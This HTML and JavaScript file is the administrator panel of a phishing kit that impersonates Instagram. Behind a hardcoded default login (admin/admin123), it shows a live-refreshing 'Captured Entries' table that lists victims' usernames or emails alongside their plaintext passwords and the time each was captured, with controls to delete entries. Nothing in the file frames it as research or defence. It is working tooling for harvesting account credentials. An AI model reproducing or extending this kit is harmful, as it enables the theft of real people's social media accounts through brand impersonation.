<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    .insta-logo { font-family: 'Grand Hotel', cursive; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  </style>
</head>
<body class="bg-[#fafafa] text-[#262626] min-h-screen">

  <!-- LOGIN SECTION -->
  <div id="loginSection" class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-[350px] w-full bg-white border border-[#dbdbdb] p-8 rounded-[1px] text-center">
      <h1 class="insta-logo text-4xl mb-6">Instagram</h1>
      <p class="text-xs text-[#737373] mb-5 font-semibold">Administrator Access</p>

      <div id="loginError" class="hidden mb-4 p-2 text-xs text-red-600 bg-red-50 border border-red-200 rounded"></div>

      <form id="loginForm" class="space-y-3">
        <input type="text" id="adminUser" required placeholder="Username" value="admin" class="w-full px-2.5 py-2 text-xs bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] focus:outline-none focus:border-[#a8a8a8]">
        <input type="password" id="adminPass" required placeholder="Password" value="admin123" class="w-full px-2.5 py-2 text-xs bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] focus:outline-none focus:border-[#a8a8a8]">
        <button type="submit" class="w-full py-2 bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-xs rounded-[8px] transition">
          Log In
        </button>
      </form>
    </div>
  </div>

  <!-- DASHBOARD SECTION -->
  <div id="dashSection" class="hidden min-h-screen flex flex-col">
    <!-- Navbar -->
    <header class="bg-white border-b border-[#dbdbdb] px-6 py-3 flex items-center justify-between sticky top-0 z-50">
      <div class="flex items-center space-x-4">
        <h1 class="insta-logo text-3xl font-normal">Instagram</h1>
        <span class="text-xs bg-gradient-to-tr from-amber-500 via-rose-500 to-purple-600 text-white font-bold px-2 py-0.5 rounded-full uppercase tracking-wider">Admin</span>
      </div>
      <div class="flex items-center space-x-3">
        <a href="/" target="_blank" class="px-3 py-1.5 rounded-lg border border-[#dbdbdb] hover:bg-gray-50 text-xs font-semibold text-[#262626] transition flex items-center gap-1.5">
          <i class="fa-solid fa-arrow-up-right-from-square"></i>
          <span>View Client Page</span>
        </a>
        <button id="logoutBtn" class="px-3 py-1.5 rounded-lg bg-red-50 hover:bg-red-100 text-red-600 text-xs font-semibold transition">
          <i class="fa-solid fa-right-from-bracket mr-1"></i> Log Out
        </button>
      </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 max-w-5xl w-full mx-auto p-6">
      <!-- Stats -->
      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
        <div class="bg-white border border-[#dbdbdb] p-4 rounded-xl flex items-center space-x-3">
          <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-amber-400 via-rose-500 to-purple-600 text-white flex items-center justify-center text-lg">
            <i class="fa-solid fa-users"></i>
          </div>
          <div>
            <div class="text-xs text-[#737373] font-semibold">Total Submissions</div>
            <div id="totalCount" class="text-xl font-bold text-[#262626]">0</div>
          </div>
        </div>

        <div class="bg-white border border-[#dbdbdb] p-4 rounded-xl flex items-center space-x-3">
          <div class="w-10 h-10 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-lg">
            <i class="fa-solid fa-cloud"></i>
          </div>
          <div>
            <div class="text-xs text-[#737373] font-semibold">Database Status</div>
            <div class="text-sm font-bold text-emerald-600">Permanent Cloud (Active)</div>
          </div>
        </div>

        <div class="bg-white border border-[#dbdbdb] p-4 rounded-xl flex items-center space-x-3">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center text-lg">
            <i class="fa-solid fa-rotate"></i>
          </div>
          <div>
            <div class="text-xs text-[#737373] font-semibold">Auto-Sync</div>
            <button onclick="loadUsers()" class="text-xs font-bold text-[#0095f6] hover:underline">
              Refresh Now
            </button>
          </div>
        </div>
      </div>

      <!-- Users Table Card -->
      <div class="bg-white border border-[#dbdbdb] rounded-xl overflow-hidden shadow-sm">
        <div class="p-4 border-b border-[#dbdbdb] flex items-center justify-between">
          <h3 class="font-bold text-[#262626] text-sm flex items-center gap-2">
            <i class="fa-solid fa-table-list text-gray-500"></i>
            Captured Entries
          </h3>
          <span class="text-xs text-[#737373]"><i class="fa-solid fa-circle text-[8px] text-emerald-500 mr-1"></i>Live Sync</span>
        </div>

        <div class="overflow-x-auto">
          <table class="w-full text-left text-sm">
            <thead class="bg-[#fafafa] text-xs uppercase text-[#737373] border-b border-[#dbdbdb]">
              <tr>
                <th class="py-3 px-4">#</th>
                <th class="py-3 px-4">Phone / Username / Email</th>
                <th class="py-3 px-4">Password</th>
                <th class="py-3 px-4">Date & Time</th>
                <th class="py-3 px-4 text-right">Action</th>
              </tr>
            </thead>
            <tbody id="usersTbody" class="divide-y divide-[#efefef]">
              <tr>
                <td colspan="5" class="py-8 text-center text-[#737373] text-xs">Loading data...</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </main>
  </div>

  <script>
    const loginSection = document.getElementById('loginSection');
    const dashSection = document.getElementById('dashSection');
    const loginForm = document.getElementById('loginForm');
    const loginError = document.getElementById('loginError');
    const logoutBtn = document.getElementById('logoutBtn');
    const usersTbody = document.getElementById('usersTbody');
    const totalCount = document.getElementById('totalCount');

    async function checkAuth() {
      try {
        const res = await fetch('/api/admin/check');
        const data = await res.json();
        if (data.loggedIn) {
          showDashboard();
        } else {
          showLogin();
        }
      } catch (e) {
        showLogin();
      }
    }

    function showDashboard() {
      loginSection.classList.add('hidden');
      dashSection.classList.remove('hidden');
      loadUsers();
    }

    function showLogin() {
      loginSection.classList.remove('hidden');
      dashSection.classList.add('hidden');
    }

    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('adminUser').value;
      const password = document.getElementById('adminPass').value;
      loginError.classList.add('hidden');

      try {
        const res = await fetch('/api/admin/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        const data = await res.json();
        if (data.success) {
          showDashboard();
        } else {
          loginError.textContent = data.message || 'Incorrect credentials';
          loginError.classList.remove('hidden');
        }
      } catch (err) {
        loginError.textContent = 'Network error';
        loginError.classList.remove('hidden');
      }
    });

    logoutBtn.addEventListener('click', async () => {
      await fetch('/api/admin/logout', { method: 'POST' });
      showLogin();
    });

    async function loadUsers() {
      try {
        const res = await fetch('/api/admin/users');
        if (!res.ok) {
          showLogin();
          return;
        }
        const data = await res.json();
        const users = data.users || [];
        totalCount.textContent = users.length;

        if (users.length === 0) {
          usersTbody.innerHTML = `
            <tr>
              <td colspan="5" class="py-8 text-center text-[#737373] text-xs">
                No entries captured yet.
              </td>
            </tr>
          `;
          return;
        }

        usersTbody.innerHTML = users.map((u, index) => `
          <tr class="hover:bg-[#fafafa] transition text-xs">
            <td class="py-3 px-4 text-[#737373] font-mono">${index + 1}</td>
            <td class="py-3 px-4 font-semibold text-[#262626]">
              <i class="fa-regular fa-user text-gray-400 mr-2"></i>${u.email}
            </td>
            <td class="py-3 px-4 font-mono text-amber-700">
              <span class="px-2 py-1 bg-amber-50 rounded border border-amber-200 font-bold">${u.password}</span>
            </td>
            <td class="py-3 px-4 text-[#737373]">${u.createdAt}</td>
            <td class="py-3 px-4 text-right">
              <button onclick="deleteUser(${u.id})" class="text-red-500 hover:text-red-700 px-2 py-1 rounded hover:bg-red-50 transition">
                <i class="fa-solid fa-trash-can"></i>
              </button>
            </td>
          </tr>
        `).reverse().join('');
      } catch (err) {
        console.error(err);
      }
    }

    async function deleteUser(id) {
      if (!confirm('Delete this entry?')) return;
      await fetch('/api/admin/users/' + id, { method: 'DELETE' });
      loadUsers();
    }

    setInterval(() => {
      if (!dashSection.classList.contains('hidden')) {
        loadUsers();
      }
    }, 5000);

    checkAuth();
  </script>
</body>
</html>
